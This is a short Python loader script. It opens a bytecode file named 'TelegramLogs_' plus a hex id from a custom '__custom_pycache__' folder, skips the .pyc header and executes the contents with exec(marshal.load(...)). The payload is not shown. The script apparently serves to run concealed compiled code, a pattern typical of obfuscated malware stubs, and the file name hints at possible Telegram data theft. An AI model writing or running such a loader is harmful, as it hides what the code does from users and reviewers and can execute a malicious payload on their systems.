
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'TelegramLogs_07c2f0486921461c9cd42d2372f6b207.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
